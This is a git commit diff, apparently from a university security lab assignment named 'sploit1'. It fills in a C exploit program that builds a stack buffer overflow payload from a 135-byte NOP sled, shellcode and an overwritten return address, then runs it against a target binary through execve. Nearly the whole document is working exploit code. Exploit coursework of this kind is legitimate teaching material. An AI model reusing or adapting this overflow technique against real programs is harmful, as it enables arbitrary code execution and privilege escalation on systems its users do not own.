33f317ad0c27006658127ac3f9dec50e0c9f5444
ab <arbeers@wisc.edu>
2023-02-10 14:34:52 -0600

    sploit1

--- sploits/sploit1.c
+++ sploits/sploit1.c
@@ -11,8 +11,18 @@ int main(void)
   char *args[3];
   char *env[1];
 
-  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
+  int i;
+  char crack_str[189];
+
+  for(i = 0; i < 135; i++) crack_str[i] = '\x90'; //no-op sled
+  strcpy(&crack_str[135], shellcode); //shellcode
+  strcpy(&crack_str[180], "\x40\xfd\xff\xbf\x40\xfd\xff\xbf"); //BFFFF70C = somewhere in nopsled
+
+  args[0] = TARGET;
+  args[1] = crack_str;
+  args[2] = NULL;
   env[0] = NULL;
+  //printf("%s\n", crack_str);
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
